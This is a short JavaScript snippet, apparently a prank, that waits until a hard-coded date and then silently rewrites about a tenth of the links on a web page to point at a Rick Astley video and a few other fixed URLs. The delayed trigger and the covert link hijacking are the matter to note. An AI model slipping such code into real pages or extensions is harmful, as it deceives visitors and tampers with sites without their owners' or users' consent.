// Link and a percentage likelihood to replace your link.
var LINKS = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ',
				'https://www.google.gr',
				'https://www.ul-ts.com/',
				'https://www.youtube.com/watch?v=4pXfHLUlZf4&feature=youtu.be&t=28s'];
var RATIO = 0.1;

var currentDate = new Date();

if(currentDate.getTime() > 1441105869000){

	function getRandomLink(){
		return LINKS[Math.floor(Math.random() * LINKS.length)];
	}

    // Get all the links on the page.
    var linksOnPage = document.getElementsByTagName("a");
    
    // Replace ~RATIO of them with Rick Astley.
    for (var i = 0; i < linksOnPage.length; i++) {
        if (Math.random() < RATIO) {
        linksOnPage[i].href = getRandomLink();
        }
    }
}
